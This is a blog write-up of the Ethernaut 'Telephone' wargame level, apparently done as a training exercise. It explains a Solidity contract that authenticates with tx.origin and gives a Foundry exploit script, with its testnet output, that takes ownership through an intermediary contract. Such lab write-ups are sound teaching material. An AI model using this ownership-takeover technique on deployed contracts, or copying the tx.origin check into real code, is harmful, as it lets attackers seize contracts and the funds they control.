---
layout: post
title: "[Ethernaut] 04.Telephone"
tags: blockchain ethernaut foundry tx.origin
---

# Analysis

---
The goal is

1. Claim ownership

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

When initially creating a contract, the `owner` is set to `msg.sender`. However, in the `changeOwner()` function, if `tx.origin` and `msg.sender` are different, **the value received as an argument** is set as the `owner`.

`tx.origin` is the address that first initiated the contract call (it's always an EOA account),

`msg.sender` is the address that last called the contract.

If I call contract A, and contract A calls contract B, a difference will arise between `tx.origin` and `msg.sender` within contract B.

# Exploit

---

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Telephone.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Ex {
    constructor(Telephone telephone_, address _address) {
        telephone_.changeOwner(_address);
    }
}

contract TelephoneSol is Script {
    Telephone public telephone_ = Telephone(0x2823D4881bbE52bBaCc385753eDf4Fb5f15167fe);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("owner: ", telephone_.owner());
        new Ex(telephone_, vm.envAddress("MY_ADDRESS"));
        console.log("owner: ", telephone_.owner());

        vm.stopBroadcast();
    }
}
```

```bash
$ forge script script/TelephoneSol.sol --broadcast --tc TelephoneSol
[⠊] Compiling...
[⠰] Compiling 1 files with Solc 0.8.29
[⠔] Solc 0.8.29 finished in 283.34ms
Compiler run successful!
Script ran successfully.

== Logs ==
  owner:  0x983B67F395c62AeE070B9c34033Bc8836E0713Eb
  owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514

## Setting up 1 EVM.

==========================

Chain 17000

Estimated gas price: 0.001913718 gwei

Estimated total gas used for script: 107575

Estimated amount required: 0.00000020586821385 ETH

==========================
⠁ Sequence #1 on holesky | Waiting for pending transactions
    ⠠ [Pending] 0xeb3d1ed29a0f8fbf261705f6b3f6d721b8a1f3e312a5d41ed3d4194ae44f274d
    ⠲ [00:00:08] [#####################################################################] 1/1 txes (0.0s)

##### holesky
✅  [Success] Hash: 0xeb3d1ed29a0f8fbf261705f6b3f6d721b8a1f3e312a5d41ed3d4194ae44f274d
Contract Address: 0x596F07f432EB60a01F9ff7007060F4982b7C01fC
Block: 3672184
Paid: 0.000000158359337 ETH (82750 gas * 0.001913708 gwei)

✅ Sequence #1 on holesky | Total Paid: 0.000000158359337 ETH (82750 gas * avg 0.001913708 gwei)

==========================

ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.
```

![Image complete]({{site.url}}/images/2025-04-18-Telephone/complete.png)

![Image owner]({{site.url}}/images/2025-04-18-Telephone/owner().png)